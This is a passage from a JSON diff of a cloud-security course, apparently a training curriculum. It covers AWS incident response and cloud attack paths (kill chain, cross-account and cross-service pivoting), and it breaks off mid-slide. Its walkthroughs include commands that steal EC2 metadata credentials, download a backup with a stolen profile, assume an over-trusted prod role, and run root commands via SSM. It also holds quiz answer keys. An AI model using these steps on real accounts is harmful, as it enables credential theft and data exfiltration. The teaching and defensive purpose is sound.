+                  "output": "aws iam update-access-key --user-name backup-svc --access-key-id AKIA... --status Inactive"
+                },
+                {
+                  "command": "# 3) isolate the instance",
+                  "output": "aws ec2 modify-instance-attribute --instance-id i-0abc --groups sg-quarantine"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Evidence Preservation",
+            "body": "You cannot destroy what you need to understand. Before (and during) eradication, preserve the evidence:\n\n- Snapshot EBS volumes of affected instances — a forensic copy of the disk, taken before you touch or terminate the host.\n- Capture memory if feasible — volatile evidence (running processes, in-memory keys) is lost on stop; capture it live if your tooling allows.\n- Preserve CloudTrail and logs — confirm the centralised, locked logs are intact; export the relevant window so retention policies can't age it out mid-investigation.\n- Record a timeline as you go — timestamps of every containment action you take, so later you can tell attacker activity from responder activity.\n\nThis is why containment favours isolation: a terminated instance is lost evidence.",
+            "check": {
+              "question": "You suspect an EC2 instance is compromised and actively exfiltrating data. Which containment action best stops the attack while preserving forensic evidence?",
+              "options": [
+                "Immediately terminate the instance",
+                "Move it to a quarantine security group with no allowed traffic, then snapshot its EBS volume",
+                "Reboot the instance to clear memory",
+                "Delete the instance's IAM role"
+              ],
+              "correctIndex": 1,
+              "explanation": "Swapping to a no-traffic quarantine security group cuts C2 and exfiltration immediately while keeping the instance and its disk/memory intact. You then snapshot the volume for forensics. Terminating or rebooting destroys volatile and disk evidence; deleting the role may break logging and unrelated systems."
+            }
+          },
+          {
+            "title": "Scoping with Athena & Detective",
+            "body": "Containment stops the attack; scoping tells you how bad it was. The question is: what did the compromised credential touch, and when?\n\n- Athena over CloudTrail — query every action by the compromised principal across the full retention window: which APIs, which resources, from which IPs, successes and denials. This is the authoritative scope.\n- Amazon Detective — visualise the principal's behaviour graph: new activity, unusual API volume, related entities. Faster for seeing the shape; Athena for the exact list.\n- Macie — if S3 was accessed, determine whether the objects read were actually sensitive.\n\nScoping drives everything downstream: which secrets to rotate, what data to disclose, how far the blast radius really went.",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "athena>",
+              "lines": [
+                {
+                  "command": "SELECT eventtime, eventname, json_extract_scalar(requestparameters,'$.bucketName') AS resource\nFROM cloudtrail_logs\nWHERE useridentity.arn = 'arn:aws:iam::1111:user/backup-svc'\n  AND eventtime BETWEEN '2026-11-15T02:00Z' AND '2026-11-15T04:00Z'\nORDER BY eventtime;",
+                  "output": "02:14 CreateAccessKey  -\n02:15 AttachUserPolicy  AdministratorAccess\n02:31 GetSecretValue    prod/db-master\n02:42 GetObject         customer-exports\n(4 rows) — full attacker timeline"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Eradication",
+            "body": "Remove every foothold and close every door the attacker opened or may have opened. Driven by the 'assume full compromise' rule:\n\n- Rotate all potentially-exposed secrets — not just the one you know leaked. Every credential the compromised principal could read: database passwords, API keys, other access keys, tokens.\n- Remove persistence — delete attacker-created IAM users, access keys, roles, and trust-policy backdoors (UpdateAssumeRolePolicy changes); revert malicious policy attachments.\n- Hunt for lateral movement — check whether the credential was used to assume other roles or reach other accounts, and eradicate there too.\n- Rebuild rather than clean where feasible — replace a compromised instance from a known-good image instead of trusting you removed everything.",
+            "diagram": {
+              "type": "graph-tree",
+              "nodes": [
+                {
+                  "id": "c",
+                  "label": "Compromised principal",
+                  "highlighted": true
+                },
+                {
+                  "id": "k",
+                  "label": "Rotate: all reachable secrets"
+                },
+                {
+                  "id": "p",
+                  "label": "Remove: attacker IAM users/keys/roles"
+                },
+                {
+                  "id": "t",
+                  "label": "Revert: trust-policy backdoors"
+                },
+                {
+                  "id": "l",
+                  "label": "Check: lateral movement to other accounts"
+                }
+              ],
+              "edges": [
+                {
+                  "from": "c",
+                  "to": "k"
+                },
+                {
+                  "from": "c",
+                  "to": "p"
+                },
+                {
+                  "from": "c",
+                  "to": "t"
+                },
+                {
+                  "from": "c",
+                  "to": "l"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Playbooks & the Core Rule",
+            "body": "Don't improvise under pressure. AWS publishes IR playbooks (the AWS Security Incident Response Guide and the open-source aws-incident-response-playbooks) that give step-by-step runbooks for common scenarios — compromised IAM credentials, compromised EC2, exposed access key in a public repo.\n\nThe principle threaded through all of them: assume credentials are fully compromised. The moment a key or role is suspected, treat everything it could access as exposed. Rotate broadly, scope thoroughly, and don't assume the attacker only did what you first noticed.\n\nRehearse with tabletop exercises — the 'Cloud IR Tabletop' lab hands you a simulated compromised access key to contain, scope from CloudTrail, and build a timeline and eradication plan, before a real incident forces you to learn it live."
+          },
+          {
+            "title": "Why It Matters",
+            "body": "Every detection you built exists to trigger this process. A perfect alarm with no rehearsed response just tells you, precisely, how badly you are being robbed.\n\nCloud IR done right contains the attacker in minutes, preserves the evidence to understand the breach, scopes the true blast radius, and eradicates every foothold so they cannot walk back in. Done wrong — improvised, evidence destroyed, half the secrets rotated — it leaves the attacker a way back and you unable to tell what was taken.\n\nThis closes the course's arc: you learned the attacks, built the logging to see them, wrote the detections to catch them, and now you have the workflow to respond. Offence, visibility, detection, response — the full cloud-security loop."
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "id": "cloud-m11",
+    "name": "Cloud Attack Paths & Post-Exploitation",
+    "shortName": "Attack Paths & PostEx",
+    "month": 4,
+    "weeks": [
+      4
+    ],
+    "description": "Synthesises everything into end-to-end, multi-stage cloud kill chains. Students chain initial access, enumeration, privilege escalation, lateral movement, persistence and exfiltration across services and accounts, thinking in attack graphs the way adversaries actually operate.",
+    "estimatedHours": 12,
+    "outcomes": [
+      "Chain multiple primitives into a full cloud kill chain from initial access to data exfiltration",
+      "Perform cross-account and cross-service lateral movement",
+      "Reason about attack paths as graphs and identify the choke points defenders should cut",
+      "Run a structured cloud red-team engagement against an owned, authorised environment"
+    ],
+    "topics": [
+      {
+        "id": "cloud-m11-1",
+        "moduleId": "cloud-m11",
+        "number": 65,
+        "title": "The Cloud Kill Chain",
+        "type": "theory",
+        "week": 4,
+        "description": "A unified model of a cloud intrusion stitching together the course's modules into stages, mapped to ATT&CK cloud tactics.",
+        "keyPoints": [
+          "Initial access (leaked key, SSRF, phished SSO) -> credential in hand",
+          "Discovery/enumeration -> privilege escalation -> lateral movement",
+          "Persistence -> collection -> exfiltration -> optional impact (ransom/crypto-mining)",
+          "Mapping each stage to MITRE ATT&CK for IaaS tactics/techniques",
+          "Dwell-time reduction as the defender's goal at each stage"
+        ],
+        "slides": [
+          {
+            "title": "What a Cloud Kill Chain Is",
+            "body": "A kill chain is the ordered set of steps an attacker walks to go from zero access to their goal. In the cloud the goal is almost always data or money.\n\nAnalogy: think of a burglar who picks a lock (initial access), wanders the house to learn the layout (discovery), finds the master key (privilege escalation), walks into other rooms (lateral movement), props a window for later (persistence), bags the jewellery (collection), and carries it out (exfiltration).\n\nThe point of the model is that an intrusion is not one bug. It is a chain of small, often boring steps. Break any link and the whole chain fails.",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "Initial Access",
+                  "detail": "leaked key, SSRF, phished SSO"
+                },
+                {
+                  "label": "Discovery",
+                  "detail": "enumerate what you can see"
+                },
+                {
+                  "label": "Priv Esc",
+                  "detail": "weak IAM to stronger role"
+                },
+                {
+                  "label": "Lateral Movement",
+                  "detail": "cross account / service"
+                },
+                {
+                  "label": "Persistence",
+                  "detail": "keep a way back in"
+                },
+                {
+                  "label": "Collection + Exfil",
+                  "detail": "stage and extract data"
+                }
+              ]
+            }
+          },
+          {
+            "title": "The Stages, Mapped to MITRE ATT&CK",
+            "body": "MITRE ATT&CK for IaaS (Infrastructure-as-a-Service) is the standard catalogue of cloud attacker behaviour. Each kill-chain stage maps to one or more ATT&CK tactics, and each tactic holds concrete techniques.\n\nJargon: a 'tactic' is the attacker's goal at a stage (e.g. Persistence). A 'technique' is how they achieve it (e.g. T1098 Account Manipulation). Using these IDs means your report speaks the same language as the blue team's detections.\n\nYou do not memorise all of them. You learn the shape so you can place any finding on the map.",
+            "diagram": {
+              "type": "graph-tree",
+              "nodes": [
+                {
+                  "id": "ia",
+                  "label": "Initial Access (TA0001)",
+                  "highlighted": true
+                },
+                {
+                  "id": "disc",
+                  "label": "Discovery (TA0007)"
+                },
+                {
+                  "id": "pe",
+                  "label": "Priv Esc (TA0004)",
+                  "highlighted": true
+                },
+                {
+                  "id": "lm",
+                  "label": "Lateral Movement (TA0008)"
+                },
+                {
+                  "id": "pers",
+                  "label": "Persistence (TA0003)"
+                },
+                {
+                  "id": "exfil",
+                  "label": "Exfiltration (TA0010)",
+                  "highlighted": true
+                }
+              ],
+              "edges": [
+                {
+                  "from": "ia",
+                  "to": "disc",
+                  "label": "cred in hand"
+                },
+                {
+                  "from": "disc",
+                  "to": "pe",
+                  "label": "found a path"
+                },
+                {
+                  "from": "pe",
+                  "to": "lm",
+                  "label": "stronger role"
+                },
+                {
+                  "from": "lm",
+                  "to": "pers",
+                  "label": "footholds"
+                },
+                {
+                  "from": "pers",
+                  "to": "exfil",
+                  "label": "objective"
+                }
+              ]
+            }
+          },
+          {
+            "title": "How It Works: Initial Access to Credential in Hand",
+            "body": "Every cloud chain starts with one thing: a usable credential or a request the cloud will honour. In AWS that is usually an access key pair, a session token, or an identity the metadata service will hand out.\n\nThree common front doors:\n- A long-lived access key leaked in a public Git repo, a Docker image layer, or a CI log.\n- SSRF (Server-Side Request Forgery) in a web app that reaches the EC2 instance metadata endpoint and returns role credentials.\n- A phished or replayed SSO/SAML session that yields a console or CLI session.\n\nOnce you can call the cloud API as some identity, discovery begins. Who am I? What can I do?",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "$",
+              "lines": [
+                {
+                  "command": "aws sts get-caller-identity",
+                  "output": "{\n  \"Account\": \"111122223333\",\n  \"Arn\": \"arn:aws:iam::111122223333:user/ci-deploy\"\n}"
+                }
+              ]
+            },
+            "check": {
+              "question": "You have a leaked AWS access key. What is the single best first command to understand the foothold?",
+              "options": [
+                "aws s3 ls (list every bucket immediately)",
+                "aws sts get-caller-identity (confirm who the key is)",
+                "aws ec2 run-instances (launch compute to pivot)",
+                "aws iam create-user (make a backdoor account)"
+              ],
+              "correctIndex": 1,
+              "explanation": "get-caller-identity is read-only, near-silent, and tells you the account and principal ARN you are acting as. You cannot plan discovery or escalation until you know who you are. Jumping to s3 ls or run-instances is noisy and may fail or alert before you understand the foothold."
+            }
+          },
+          {
+            "title": "Worked Example: The First Minutes",
+            "body": "After confirming identity you enumerate permissions and reachable resources. The attacker is building a mental map. Everything here is read-only and maps to ATT&CK Discovery.\n\nThe key insight: the cloud control plane is an API. Enumeration is just calling that API and reading JSON. There is no 'network' to scan first the way you would on-prem.",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "$",
+              "lines": [
+                {
+                  "command": "aws iam list-attached-user-policies --user-name ci-deploy",
+                  "output": "AttachedPolicies:\n- PolicyName: AmazonS3FullAccess\n- PolicyName: IAMReadOnlyAccess"
+                },
+                {
+                  "command": "aws s3 ls",
+                  "output": "2024-02-11 app-prod-assets\n2024-02-11 app-backups-encrypted\n2024-02-11 cf-templates-xyz"
+                },
+                {
+                  "command": "aws iam list-roles --query 'Roles[].RoleName'",
+                  "output": "[ \"ec2-app-role\", \"lambda-exec-role\", \"OrganizationAccountAccessRole\" ]"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Discovery to Privilege Escalation to Lateral Movement",
+            "body": "The middle of the chain is where a weak foothold becomes a strong one.\n\n- Discovery finds a misconfiguration: maybe the ci-deploy user can call iam:PassRole and lambda:CreateFunction.\n- Privilege escalation abuses it: pass a powerful role to a new Lambda you control, and now your code runs as that role.\n- Lateral movement spends the new power: the stronger role can read other services, assume roles in other accounts, or run commands on instances.\n\nIn cloud, lateral movement is rarely host-to-host. It is identity-to-identity and service-to-service. You move by assuming roles and calling APIs, not by popping shells.",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "Weak user",
+                  "detail": "ci-deploy, S3 + PassRole"
+                },
+                {
+                  "label": "Abuse PassRole",
+                  "detail": "attach admin role to new Lambda"
+                },
+                {
+                  "label": "Run as admin role",
+                  "detail": "Lambda executes attacker code"
+                },
+                {
+                  "label": "Assume prod role",
+                  "detail": "cross-account AssumeRole"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Persistence, Collection, Exfiltration, Impact",
+            "body": "With strong access the attacker secures the win.\n\n- Persistence: create a backdoor IAM role or access key so losing the first key does not matter.\n- Collection: find and stage the crown-jewel data (customer DB, backups, secrets).\n- Exfiltration: move it out via a public bucket, a pre-signed URL, or a cross-account copy.\n- Impact (optional): some actors go further with ransomware (delete backups, encrypt), crypto-mining (spin up GPU fleets), or destruction.\n\nMost real intrusions stop at exfiltration because data is the money. Impact is a choice, not a requirement.",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "Persist",
+                  "detail": "backdoor role / key"
+                },
+                {
+                  "label": "Collect",
+                  "detail": "find crown-jewel data"
+                },
+                {
+                  "label": "Exfiltrate",
+                  "detail": "copy out of the account"
+                },
+                {
+                  "label": "Impact?",
+                  "detail": "ransom / mining / wipe"
+                }
+              ]
+            }
+          },
+          {
+            "title": "How Defenders Cut Dwell Time",
+            "body": "Dwell time is how long an attacker operates before being caught. The defender's job at every stage is to shrink it. The chain model tells them where a single cut hurts the attacker most.\n\nThe cheapest wins are early: short-lived credentials, no public keys, and SSRF-resistant metadata (IMDSv2) kill most initial access. The highest-leverage controls are in the middle: removing iam:PassRole and broad AssumeRole collapses escalation and lateral paths at once.",
+            "diagram": {
+              "type": "comparison",
+              "columns": [
+                {
+                  "label": "Attacker needs",
+                  "points": [
+                    "Long-lived creds",
+                    "Broad PassRole",
+                    "Silent API calls",
+                    "Writable backups"
+                  ]
+                },
+                {
+                  "label": "Defender cuts",
+                  "points": [
+                    "Short-lived SSO sessions",
+                    "Scoped roles, no wildcard PassRole",
+                    "CloudTrail + GuardDuty alerts",
+                    "Immutable / versioned backups"
+                  ],
+                  "highlighted": true
+                }
+              ]
+            }
+          },
+          {
+            "title": "Why It Matters",
+            "body": "Thinking in chains, not findings, is the single biggest shift from scanner-driven work to adversary-driven work.\n\nA scanner reports 200 'medium' misconfigurations and no priority. The kill-chain lens asks one question: which of these actually connect into a path to the crown jewels? Usually only a handful do, and cutting one shared edge (like a reused PassRole) can break dozens of theoretical paths at once.\n\nThis framing is the backbone of the rest of this module. Every later topic, cross-account movement, pivoting, persistence, exfiltration, is one link you will now chain into a complete, reportable attack narrative."
+          }
+        ]
+      },
+      {
+        "id": "cloud-m11-2",
+        "moduleId": "cloud-m11",
+        "number": 66,
+        "title": "Cross-Account Movement",
+        "type": "lab",
+        "week": 4,
+        "description": "Accounts are a boundary attackers work hard to cross. Students exploit the trust relationships that let a foothold in one account reach another.",
+        "keyPoints": [
+          "Over-trusting AssumeRole across accounts; third-party vendor roles",
+          "Resource policies (S3, KMS, SNS) granting cross-account access",
+          "Organization-level trust and management-account compromise impact",
+          "CI/CD pipelines bridging accounts (deploy roles as pivot points)",
+          "Mitigation: aws:PrincipalOrgID, ExternalId, Access Analyzer external findings"
+        ],
+        "slides": [
+          {
+            "title": "What Cross-Account Movement Is",
+            "body": "Most organisations split AWS into many accounts: dev, staging, prod, security, logging. An account is a hard billing and blast-radius boundary. Attackers want to cross it, moving from a low-value account they already own into a high-value one.\n\nAnalogy: a company campus with separate buildings. Your badge opens the dev building. Cross-account movement is finding that the dev badge also opens a side door into the prod building, because someone wired the access list too loosely.\n\nThe crossings are not bugs in AWS. They are trust relationships that were configured too broadly.",
+            "diagram": {
+              "type": "graph-tree",
+              "nodes": [
+                {
+                  "id": "dev",
+                  "label": "Dev account 111...",
+                  "highlighted": true
+                },
+                {
+                  "id": "prod",
+                  "label": "Prod account 999...",
+                  "highlighted": true
+                },
+                {
+                  "id": "sec",
+                  "label": "Security account 222..."
+                }
+              ],
+              "edges": [
+                {
+                  "from": "dev",
+                  "to": "prod",
+                  "label": "over-trusting AssumeRole"
+                },
+                {
+                  "from": "dev",
+                  "to": "sec",
+                  "label": "SNS/KMS resource policy"
+                }
+              ]
+            }
+          },
+          {
+            "title": "How It Works: Cross-Account AssumeRole",
+            "body": "The main mechanism is IAM role trust. A role in the target account has a 'trust policy' (who may assume it) and a 'permissions policy' (what it can do). To cross accounts, the trust policy must name a principal in another account.\n\nThe dangerous pattern is a trust policy whose Principal is a whole account (\"arn:aws:iam::111...:root\") or even \"*\". That says 'anyone in account 111 may become this role'. If you control any identity in 111, you can assume it.\n\nYou call sts:AssumeRole against the target role ARN and receive temporary credentials for the target account.",
+            "diagram": {
+              "type": "request-response",
+              "leftLabel": "Attacker (dev acct)",
+              "rightLabel": "AWS STS",
+              "exchanges": [
+                {
+                  "direction": "right",
+                  "label": "sts:AssumeRole",
+                  "payload": "RoleArn=arn:aws:iam::999...:role/CrossAcctAdmin"
+                },
+                {
+                  "direction": "left",
+                  "label": "Temp creds",
+                  "payload": "AccessKeyId + SessionToken for account 999..."
+                }
+              ]
+            }
+          },
+          {
+            "title": "Worked Example: Pivoting Dev to Prod",
+            "body": "You hold a dev-account identity. Enumeration found a role in prod (999...) whose trust policy over-trusts the whole dev account. You assume it and now operate in prod.\n\nThe CLI makes this trivial: assume-role returns a short-lived key/secret/token you export into your environment, then every subsequent command runs as the prod role.",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "$",
+              "lines": [
+                {
+                  "command": "aws sts assume-role --role-arn arn:aws:iam::999999999999:role/CrossAcctAdmin --role-session-name x",
+                  "output": "Credentials:\n  AccessKeyId: ASIA...\n  SecretAccessKey: ****\n  SessionToken: FwoGZ..."
+                },
+                {
+                  "command": "aws sts get-caller-identity",
+                  "output": "{ \"Account\": \"999999999999\", \"Arn\": \".../CrossAcctAdmin/x\" }"
+                }
+              ]
+            },
+            "check": {
+              "question": "A role's trust policy sets Principal to \"arn:aws:iam::111122223333:root\". What does this actually allow?",
+              "options": [
+                "Only the AWS root user of account 111122223333 may assume the role",
+                "Any IAM principal in account 111122223333 (with sts:AssumeRole permission) may assume the role",
+                "Nobody, because root cannot be a trust principal",
+                "Every account in the AWS organization"
+              ],
+              "correctIndex": 1,
+              "explanation": "\":root\" in a trust policy does NOT mean the root user. It is AWS shorthand for 'the entire account' as a trust anchor, delegating the decision to that account's own IAM. So any principal there that is also allowed sts:AssumeRole can assume the role."
+            }
+          },
+          {
+            "title": "Variant: Resource Policies Grant Cross-Account Access",
+            "body": "AssumeRole is not the only crossing. Many services have 'resource policies' attached directly to the resource, and these can name external accounts:\n\n- S3 bucket policy allowing another account to GetObject/PutObject.\n- KMS key policy allowing another account to Decrypt (so they can read anything that key encrypted).\n- SNS/SQS/Secrets Manager policies granting cross-account subscribe or read.\n\nThese are quiet crossings: no role is assumed, you simply call the resource from your own account and the resource policy says yes. A permissive KMS key policy is especially nasty: it can silently unlock encrypted data across the boundary.",
+            "diagram": {
+              "type": "comparison",
+              "columns": [
+                {
+                  "label": "Identity-based crossing",
+                  "points": [
+                    "sts:AssumeRole",
+                    "Needs a trusting role",
+                    "Shows AssumeRole in CloudTrail"
+                  ]
+                },
+                {
+                  "label": "Resource-policy crossing",
+                  "points": [
+                    "Bucket / KMS / SNS policy",
+                    "No role assumed",
+                    "Call the resource directly",
+                    "Easy to miss in audits"
+                  ],
+                  "highlighted": true
+                }
+              ]
+            }
+          },
+          {
+            "title": "Variant: Organization Trust and the Management Account",
+            "body": "AWS Organizations ties many accounts under one management (payer) account. This creates powerful implicit trust.\n\n- Most orgs have a role like OrganizationAccountAccessRole in every member account, trusting the management account. Compromise the management account and you often reach every child account.\n- Service Control Policies (SCPs) are set from the management account; whoever controls it controls the guardrails for the whole org.\n\nThe management account is the crown of crowns. Third-party vendor roles are the other classic risk: a monitoring or CSPM vendor you granted an external role becomes a path in if the vendor is breached.",
+            "diagram": {
+              "type": "graph-tree",
+              "nodes": [
+                {
+                  "id": "mgmt",
+                  "label": "Management acct",
+                  "highlighted": true
+                },
+                {
+                  "id": "a1",
+                  "label": "Member: dev"
+                },
+                {
+                  "id": "a2",
+                  "label": "Member: prod"
+                },
+                {
+                  "id": "vendor",
+                  "label": "3rd-party vendor"
+                }
+              ],
+              "edges": [
+                {
+                  "from": "mgmt",
+                  "to": "a1",
+                  "label": "OrgAccountAccessRole"
+                },
+                {
+                  "from": "mgmt",
+                  "to": "a2",
+                  "label": "OrgAccountAccessRole"
+                },
+                {
+                  "from": "vendor",
+                  "to": "a2",
+                  "label": "external vendor role"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Find and Test It",
+            "body": "To hunt cross-account exposure, read every trust policy and resource policy and ask: does any Principal name an account or ARN outside this account, or use a wildcard?\n\n- IAM roles: list roles, dump each AssumeRolePolicyDocument, flag external or \"*\" principals.\n- AWS IAM Access Analyzer is the native tool: it continuously reports resources shared outside your account or org as 'external findings'.\n- For a given foothold, tools like enumerate-iam or Pacu's iam__enum_roles help, but the ground truth is the trust/resource policy documents.\n\nAlways confirm by actually assuming or calling the resource in an authorised test, do not report a theoretical path you never traversed.",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "$",
+              "lines": [
+                {
+                  "command": "aws accessanalyzer list-findings --analyzer-arn $A --query 'findings[?isPublic==`false`]'",
+                  "output": "- resource: arn:aws:iam::999...:role/CrossAcctAdmin\n  principal: { AWS: \"111122223333\" }\n  status: ACTIVE"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Defend It: Lock the Trust Down",
+            "body": "Three controls close most cross-account holes:\n\n- aws:PrincipalOrgID condition: restrict AssumeRole and resource policies to principals inside your own organization, so a stolen ARN from outside cannot assume the role.\n- ExternalId on third-party roles: a shared secret the vendor must pass, defeating the 'confused deputy' where another of the vendor's customers assumes your role.\n- Access Analyzer external findings reviewed continuously, plus least-privilege trust (name specific role ARNs, never an account \":root\" or \"*\").\n\nPrefer scoping the Principal to exact role ARNs over whole accounts. Every broadening of a trust policy is a potential cross-account door.",
+            "diagram": {
+              "type": "comparison",
+              "columns": [
+                {
+                  "label": "Weak trust",
+                  "points": [
+                    "Principal: 111...:root",
+                    "No conditions",
+                    "Reusable across vendor tenants"
+                  ]
+                },
+                {
+                  "label": "Hardened trust",
+                  "points": [
+                    "Principal: exact role ARN",
+                    "Condition aws:PrincipalOrgID",
+                    "Condition sts:ExternalId",
+                    "Access Analyzer monitored"
+                  ],
+                  "highlighted": true
+                }
+              ]
+            }
+          },
+          {
+            "title": "Why It Matters",
+            "body": "Account boundaries are the main thing standing between a minor dev compromise and a full prod breach. Teams invest heavily in multi-account structure precisely to contain blast radius, and a single over-broad trust policy quietly undoes all of it.\n\nFor the attacker, one cross-account edge can turn a throwaway foothold into total impact. For the defender, these edges are rare, high-value, and discoverable, exactly the kind of choke point worth cutting first.\n\nIn the Cross-Account Pivot lab you will exploit a misconfigured trust from a dev sandbox into a prod sandbox and prove the blast radius, the same pattern behind many real-world cloud breaches."
+          }
+        ]
+      },
+      {
+        "id": "cloud-m11-3",
+        "moduleId": "cloud-m11",
+        "number": 67,
+        "title": "Cross-Service Pivoting",
+        "type": "lab",
+        "week": 4,
+        "description": "Moving laterally through services, not hosts. A permission on one service often yields access to another via passed roles and resource access.",
+        "keyPoints": [
+          "EC2 -> metadata role -> S3/DynamoDB data",
+          "Lambda/Glue/CloudFormation as compute to assume passed roles",
+          "SSM Run Command / Session Manager to execute on instances without SSH",
+          "RDS/DynamoDB data access from a compromised app role",
+          "Systems Manager and automation documents as a pivot surface"
+        ],
+        "slides": [
+          {
+            "title": "What Cross-Service Pivoting Is",
+            "body": "Within a single account, a permission on one service often hands you access to another. You pivot through services, not hosts.\n\nAnalogy: a hotel key card that opens the gym. The gym has a phone, the phone has the front-desk extension, the front desk holds the master key. No single door was 'admin', but chained together they get you everywhere.\n\nThe glue is almost always an IAM role: compute services (EC2, Lambda, Glue) run with an attached role, and that role's permissions become yours once you control the compute.",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "Compromise app",
+                  "detail": "SSRF / RCE on EC2"
+                },
+                {
+                  "label": "Grab instance role",
+                  "detail": "via metadata service"
+                },
+                {
+                  "label": "Role reads data",
+                  "detail": "S3 / DynamoDB"
+                },
+                {
+                  "label": "Role assumes more",
+                  "detail": "pivot further"
+                }
+              ]
+            }
+          },
+          {
+            "title": "How It Works: EC2 Metadata to Role to Data",
+            "body": "Every EC2 instance can query a link-local metadata endpoint at 169.254.169.254. If the instance has an IAM role, that endpoint returns temporary credentials for the role.\n\nMechanism, step by step:\n1. You reach the instance (shell via RCE, or SSRF that makes the app fetch the metadata URL for you).\n2. You request the security-credentials path; it returns an access key, secret and session token.\n3. You use those credentials off-box to call whatever the instance role is allowed, often S3 or DynamoDB.\n\nIMDSv1 answers any GET request, which is what makes SSRF so dangerous here. IMDSv2 requires a PUT to fetch a token first, which most SSRF cannot do.",
+            "diagram": {
+              "type": "request-response",
+              "leftLabel": "Attacker / SSRF",
+              "rightLabel": "169.254.169.254",
+              "exchanges": [
+                {
+                  "direction": "right",
+                  "label": "GET credentials",
+                  "payload": "/latest/meta-data/iam/security-credentials/ec2-app-role"
+                },
+                {
+                  "direction": "left",
+                  "label": "Role creds",
+                  "payload": "{ AccessKeyId, SecretAccessKey, Token, Expiration }"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Worked Example: Metadata Creds to S3",
+            "body": "Having popped a shell on an app server, you pull the instance role credentials from the metadata service and use them to read a bucket the role can access. This is ATT&CK T1552.005 (Credentials from the instance metadata service).",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "$",
+              "lines": [
+                {
+                  "command": "TOKEN=$(curl -sX PUT \"http://169.254.169.254/latest/api/token\" -H \"X-aws-ec2-metadata-token-ttl-seconds: 60\")",
+                  "output": ""
+                },
+                {
+                  "command": "curl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-app-role",
+                  "output": "{ \"AccessKeyId\":\"ASIA...\", \"SecretAccessKey\":\"...\", \"Token\":\"...\" }"
+                },
+                {
+                  "command": "aws s3 cp s3://app-backups-encrypted/db.sql.gz . --profile stolen",
+                  "output": "download: s3://app-backups-encrypted/db.sql.gz to ./db.sql.gz"
+                }
+              ]
+            },
+            "check": {
+              "question": "An SSRF bug lets you make the app issue arbitrary GET requests. Which IMDS version blocks this credential theft, and why?",
+              "options": [
+                "IMDSv1, because it encrypts the response",
+                "IMDSv2, because it requires a prior PUT to obtain a session token that most SSRF cannot send",
+                "Neither; SSRF always wins",
+                "IMDSv1, because it rate-limits GET requests"
+              ],
+              "correctIndex": 1,
+              "explanation": "IMDSv2 is session-oriented: you must first PUT to /latest/api/token to get a token, then send it as a header on every GET. Typical SSRF primitives only perform GETs and cannot add custom headers or do the PUT, so IMDSv2 defeats most SSRF-based credential theft. Enforcing IMDSv2 (HttpTokens=required) is the fix."
+            }
+          },
+          {
+            "title": "Variant: Compute Services and Passed Roles",
+            "body": "EC2 is not the only compute that carries a role. Lambda, Glue, CodeBuild, ECS tasks and CloudFormation all run with roles you can abuse if you can create or modify them.\n\nThe key permission is iam:PassRole paired with a 'create execution' permission:\n- lambda:CreateFunction + iam:PassRole: create a function with a powerful role, run your code as it.\n- glue:CreateJob / codebuild / cloudformation: same idea, different compute.\n\nAWS lets a weak identity 'pass' a strong role to a service it controls. If PassRole is not tightly scoped to specific roles, this is a direct privilege-escalation primitive. This is one of the most common real escalation paths.",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "Weak identity",
+                  "detail": "has lambda:CreateFunction + iam:PassRole"
+                },
+                {
+                  "label": "Create Lambda",
+                  "detail": "attach admin role via PassRole"
+                },
+                {
+                  "label": "Invoke it",
+                  "detail": "code runs as admin role"
+                },
+                {
+                  "label": "Admin actions",
+                  "detail": "full escalation"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Variant: SSM, Run Command and Data Services",
+            "body": "AWS Systems Manager (SSM) is a powerful pivot that needs no SSH or open ports.\n\n- ssm:SendCommand (Run Command) executes shell commands as root/SYSTEM on any instance running the SSM agent. If your role has it, you own those instances remotely.\n- ssm:StartSession (Session Manager) gives an interactive shell through the AWS API, bypassing security groups entirely.\n- Automation documents (SSM runbooks) can be abused as a pivot to run privileged actions.\n\nData services complete the picture: a compromised app role frequently reads RDS, DynamoDB or Secrets Manager directly, because the app was granted that access and you now hold the app's role.",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "$",
+              "lines": [
+                {
+                  "command": "aws ssm send-command --document-name AWS-RunShellScript --targets Key=instanceids,Values=i-0ab --parameters commands='id'",
+                  "output": "CommandId: 1d4f...  Status: Pending"
+                },
+                {
+                  "command": "aws ssm list-command-invocations --command-id 1d4f... --details --query 'CommandInvocations[0].CommandPlugins[0].Output'",
+                  "output": "uid=0(root) gid=0(root) groups=0(root)"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Find and Test It",
+            "body": "To spot pivot paths, enumerate which roles are attached to compute and which dangerous permissions principals hold.\n\n- Check instance metadata options: HttpTokens=required means IMDSv2 enforced; 'optional' means IMDSv1 still works (SSRF risk).\n- Grep IAM policies for iam:PassRole, especially with Resource \"*\", plus any create/invoke verb (lambda, glue, ec2:RunInstances, ssm:SendCommand).\n- Tools: Pacu modules (iam__privesc_scan), and later in this module PMapper, which computes these pivot edges automatically.\n\nValidate by actually performing the pivot in your authorised lab, then record the exact commands for the report.",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "$",
+              "lines": [
+                {
+                  "command": "aws ec2 describe-instances --query 'Reservations[].Instances[].MetadataOptions.HttpTokens'",
+                  "output": "[ \"optional\" ]   # IMDSv1 still allowed - SSRF exposure"
+                },
+                {
